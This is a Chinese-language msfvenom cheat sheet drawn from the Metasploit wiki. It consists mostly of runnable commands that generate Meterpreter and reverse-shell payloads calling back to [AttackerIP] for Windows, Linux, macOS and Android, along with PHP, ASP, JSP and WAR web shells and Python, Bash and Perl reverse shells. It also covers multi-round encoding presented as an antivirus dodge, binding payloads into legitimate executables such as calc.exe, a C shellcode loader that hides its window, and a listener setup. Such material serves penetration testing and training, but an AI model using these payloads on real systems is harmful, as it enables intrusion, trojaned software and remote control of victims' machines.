>参考官方wiki https://github.com/rapid7/metasploit-framework/wiki

>https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom


### 简介
**msfvenom**是Metasploit框架中独立的payload生成器。
（2015.6.8取代了之前的 `msfpayload` 和 `msfencode`）

### msfvenom所有命令

```
root@kali:~# msfvenom -h
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>

Options:
    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
    -f, --format        <format>     Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder       <encoder>    The encoder to use
    -a, --arch          <arch>       The architecture to use
        --platform      <platform>   The platform of the payload
        --help-platforms             List available platforms
    -s, --space         <length>     The maximum size of the resulting payload
        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
    -i, --iterations    <count>      The number of times to encode the payload
    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
    -x, --template      <path>       Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out           <path>       Save the payload
    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
    -h, --help                       Show this message
```


### 列出msf可用的payload

```
root@kali:~# msfvenom -l payloads

Framework Payloads (486 total)
==============================

    Name                                                Description
    ----                                                -----------
    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
    aix/ppc/shell_find_port                             Spawn a shell on an established connection
    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)
    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
    ...
```

### 生成payload - 格式说明

* 生成不经过编码的普通payload（不编码->生成内容固定->直接被杀）

```
#格式
msfvenom -p <payload> <payload options> -f <format> -o <path>
#实例
msfvenom –p windows/meterpreter/reverse_tcp –f c –o 1.c
```

* 经过编码器处理后生成payload

```
#格式
msfvenom -p <payload> -e <encoder > -i <encoder times> -n <nopsled> -f <format> -o <path>
#实例
msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe
```

* 捆绑到正常文件后生成payload（暂未测试是否可加-e参数）

```
Msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\calc.exe –k –f exe –o C:\shell.exe
```



### -p [指定攻击载荷名称]

生成payload至少需指定-p 和 -f

除了自带的那些payload外
`-p -`可指定自定义的payload ，如：

```
cat payload_file.bin | msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
```


```
#暂未测试
cat 1.exe | msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f exe -o 2.exe
```


### -f [指定payload的输出格式]

按需要的格式进行输出：
十六进制hex编码形式 `\x0a`
如果用python写exploit，用`-f python`得到python代码。
如果用python写exploit，用`-f c`得到c代码。


生成一个exe格式的payload，如：
`msfvenom -p windows/meterpreter/bind_tcp -f exe`


**msf支持的输出格式**

```
msfvenom --help-formats
Executable formats
	asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
Transform formats
	bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```


### -a x64

-a x86

-a x86_64

```
msfvenom -p windows/meterpreter/bind_tcp --help-platform

Platforms
	aix, android, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, ruby, solaris, unix, windows
```

	
-a不指定也可以，可在-p后的payload名称中明确指定architecture，如：

```
msfvenom -p linux/x86/exec CMD=/bin/sh
```

此payload指定了参数CMD

查看某个Payload具体需要哪些参数（ Required是yes则必需该参数）

`msfvenom -p linux/x86/exec --payload-options`

### 对payload进行编码

1.规避特殊字符  -b '/x00一个特殊字符列表'

msf会自动找一个合适的编码器规避payload中的这些“坏字符”:
`msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw`

```
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
```

不同的函数，有不同的规避字符：
如gets就需要避免`/x0a`
如scanf更严格，不允许空白符
如产生一段exec的shellcode

2.用-e选项指定编码器encoder，如：

```
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
```

默认的输出格式是raw，直接输出payload的字符（含乱码），常加参数-o写到文件中。


3.使用-i选项进行多次编码
迭代编码也许会有规避杀毒软件的作用，但这不是真正的免杀。

迭代编码 例子：
`msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3`


msf中所有的编码器：

```
msfvenom -l encoders

Framework Encoders
==================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```


### -x 指定一个模板文件（“捆绑“payload到这个正常的可执行文件）

msfvenom使用的模板文件保存在目录`msf/data/templates`

-x calc.exe
捆绑payload到 正常文件（模板文件=宿主文件=自定义的可执行文件）

使用-x选项指定你自己的模板文件（如exe等），如：
使用windows下的calc.exe作为模板文件,生成payload：

```
msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
```

注意，在win x64下使用自定义的x64的模板文件（如exe等）创建x64的payload时，输出格式必须要写`-f exe-only`而不能写`-f exe`
（Please note: If you'd like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only:）

```
msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
```

-x选项经常和-k选项一起用，它允许您从模板中将payload作为新的线程运行。但是它目前只支持较老的系统，如x86 Windows XP.
（The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP.）

### How to chain msfvenom output

The old msfpayload and msfencode utilities were often chained together in order layer on multiple encodings. This is possible using msfvenom as well:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
```


### 编译生成的C文件
```bash
#win x86生成c文件
msfvenom -p windows/meterpreter/reverse_tcp lhost=[AttackerIP] lport=4444 -f c -e x86/shikata_ga_nai -i 12 -b '\x00'


#vc++6.0 编译（含buf数组的）C代码：
#include <stdio.h>
#pragmacomment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//运行时不显示窗口
unsignedchar buf[] =
"buf数组";//复制数组内容 粘贴到此处
main()
{
((void(*)(void))&buf)();
}


#VS 编译：
main()

{

	Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(Memory, buf, sizeof(buf));

	((void(*)())Memory)();

}
```


### 生成典型payload：各系统下的反向连接后门

reverse_tcp 支持以下平台：
Platform: Android, BSD, Java, JavaScript, Linux, OSX, NodeJS, PHP, Python, Ruby, Solaris, Unix, Windows, Mainframe, Multi

```
#win x86
msfvenom -p windows/meterpreter/reverse_tcp lhost=[AttackerIP] lport=4444 -f exe -o /tmp/my_payload.exe
x86下 -p后加: windows/../..
没有这种名字的载荷: windows/x86/../.. 


#linux x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f elf > shell.elf

#Mac x64
msfvenom -p osx/x64/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f macho > shell.macho


#android
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 R > androvirus.apk
```

Web

```
#PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

#.ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f asp > shell.asp

#.JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw > shell.jsp

#java    .WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f war > shell.war
```

脚本

```
#Python
msfvenom -p cmd/unix/reverse_python LHOST=[AttackerIP] LPORT=[AttackerPort]  -f raw > shell.py
#Bash
msfvenom -p cmd/unix/reverse_bash LHOST=[AttackerIP]  LPORT=[AttackerPort]  -f raw > shell.sh
#Perl
msfvenom -p cmd/unix/reverse_perl LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw > shell.pl
```

### msfconsole监听并接受连入的shell 创建session

**Handlers说明**
ijup Metasploit to be in a position to receive your incoming shells. 
Handlers should be in the following format.


**use exploit/multi/handler**

```
use exploit/multi/handler 
show options
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST [AttackerIP]
#默认4444端口
set LPORT [AttackerPort]
set ExitOnSession false
exploit -j -z
```
